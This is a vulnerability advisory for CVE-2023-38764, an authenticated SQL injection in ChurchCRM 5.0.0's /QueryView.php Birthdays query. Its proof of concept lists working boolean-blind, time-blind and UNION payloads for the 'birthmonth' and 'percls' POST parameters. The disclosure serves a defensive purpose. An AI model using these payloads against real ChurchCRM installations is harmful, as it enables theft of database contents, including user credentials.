# CVE-2023-38764 - SQL Injection in /QueryView.php?QueryID=18

|                 |                                                                                      |
| --------------- | --------------- |
| Researchers     | Rowan Crowley                                                               |
| Severity        | TBD                                   |
| Published       | TBD         |
| Software Link   | https://github.com/ChurchCRM/CRM             |

## Description
A SQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive database information via the `birthmonth` and `percls` parameters within the `/QueryView.php` endpoint. An authenticated attacker can use injection to perform arbitrary SQL queries via POST request with the `birthmonth` parameter or the `percls` parameter at the `/QueryView.php?QueryID=18` endpoint (Birthdays query). This can be used for information disclosure of anything in the database, including user credentials.

## Proof of Concept
    Parameter: birthmonth (POST)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: birthmonth=6 AND 7848=7848&percls=1&Submit=Execute Query
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: birthmonth=6 AND (SELECT 7081 FROM (SELECT(SLEEP(5)))brmV)&percls=1&Submit=Execute Query
    
        Type: UNION query
        Title: Generic UNION query (NULL) - 3 columns
        Payload: birthmonth=6 UNION ALL SELECT NULL,CONCAT(0x716b717171,0x536a6679625372547877727a55424366686c45556347796362744c4d494c79496855715a6f6f4b69,0x717a787871),NULL-- -&percls=1&Submit=Execute Query
    
    
    Parameter: percls (POST)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: birthmonth=1&percls=1 AND 2916=2916&Submit=Execute Query
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: birthmonth=1&percls=1 AND (SELECT 7059 FROM (SELECT(SLEEP(5)))dttR)&Submit=Execute Query
    
        Type: UNION query
        Title: Generic UNION query (NULL) - 3 columns
        Payload: birthmonth=1&percls=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b717171,0x5178467167524e626146526e757a4c52537a5479584d7672684e5373496658787158736e43754279,0x717a787871)-- -&Submit=Execute Query
